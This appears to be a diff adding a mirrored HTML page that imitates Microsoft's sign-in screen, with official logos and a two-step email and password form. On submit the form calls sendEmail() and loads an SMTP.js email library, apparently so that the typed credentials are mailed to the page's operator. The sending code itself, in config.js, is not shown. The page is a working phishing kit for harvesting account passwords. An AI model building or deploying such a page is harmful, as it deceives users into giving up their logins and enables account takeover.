@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from jocular-c-5f8.netlify.app/mail/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 10 Jun 2024 01:19:29 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Signin</title>
+</head>
+<body>
+    <!-- SUBSCRIBE ==> https://www.youtube.com/channel/UCzWS-AiirxpTDq_AGSg9Fhg -->
+    <!-- JOIN FACEBOOK GROUP ==> https://www.facebook.com/groups/html.css.javascript.alb -->
+
+    <!-- SUBSCRIBE ==> https://www.youtube.com/channel/UCzWS-AiirxpTDq_AGSg9Fhg -->
+    <!-- JOIN FACEBOOK GROUP ==> https://www.facebook.com/groups/html.css.javascript.alb -->
+    <div class="container">
+        <form onsubmit="sendEmail(); reset(); return false;" autocomplete="off" >
+            <img class="logo" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg">
+            <div class="forms-container">
+                <div class="forms">
+                    <div class="first">
+                        <h2>Sign in</h2>
+                        <div class="form-group">
+                            <input type="email" id="uname" placeholder="Email, Phone, or Skype">
+                        </div>
+                        <p>No account? <a href="#">Create One!</a></p>
+                        <a href="#">Sign in with a security key <span>?</span></a>
+                        <button type="button" class="next-btn">Next</button>
+                    </div>
+                    <div class="second">
+                        <p><span class="arrow-btn">&#8592;</span> <span class="email">helloworld@hotmail.com</span></p>
+                        <h2>Enter password</h2>
+                        <div class="form-group">
+                            <input type="password" id="upass" placeholder="Password">
+                        </div>
+                        <a href="#">Forgot password?</a>
+                        <p id="country" style="display: none;" ></p>
+                            <p id="region" style="display: none;"></p>
+                        <button type="submit">Sign in</button>
+                    </div>
+                </div>
+            </div>
+        </form>
+        <div class="bottom">
+            <img src="https://logincdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg">
+            <span>Sign-in options</span>
+        </div>
+    </div>
+
+    <!-- SUBSCRIBE ==> https://www.youtube.com/channel/UCzWS-AiirxpTDq_AGSg9Fhg -->
+    <!-- JOIN FACEBOOK GROUP ==> https://www.facebook.com/groups/html.css.javascript.alb -->
+    
+    <!-- SUBSCRIBE ==> https://www.youtube.com/channel/UCzWS-AiirxpTDq_AGSg9Fhg -->
+    <!-- JOIN FACEBOOK GROUP ==> https://www.facebook.com/groups/html.css.javascript.alb -->
+
+    <script>
+        const forms = document.querySelector('.forms')
+        const next_button = document.querySelector('.next-btn')
+        const arrow_btn = document.querySelector('.arrow-btn')
+
+        const email_input = document.querySelector('.first input')
+        const email_el = document.querySelector('.email')
+
+        next_button.addEventListener('click', () => {
+            forms.classList.add('next-form')
+            email_el.innerText = email_input.value
+            document.querySelector('.bottom').style.display = 'none'
+        })
+        arrow_btn.addEventListener('click', () => {
+            forms.classList.remove('next-form')
+            document.querySelector('.bottom').style.display = 'flex'
+        })
+    </script>
+
+<script src="config.js"></script>
+<script src="../../smtpjs.com/v3/smtp.js"></script>
+
+    <!-- SUBSCRIBE ==> https://www.youtube.com/channel/UCzWS-AiirxpTDq_AGSg9Fhg -->
+    <!-- JOIN FACEBOOK GROUP ==> https://www.facebook.com/groups/html.css.javascript.alb -->
+    
+    <!-- SUBSCRIBE ==> https://www.youtube.com/channel/UCzWS-AiirxpTDq_AGSg9Fhg -->
+    <!-- JOIN FACEBOOK GROUP ==> https://www.facebook.com/groups/html.css.javascript.alb -->
+</body>
+
+<!-- Mirrored from jocular-c-5f8.netlify.app/mail/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 10 Jun 2024 01:19:32 GMT -->
+</html>
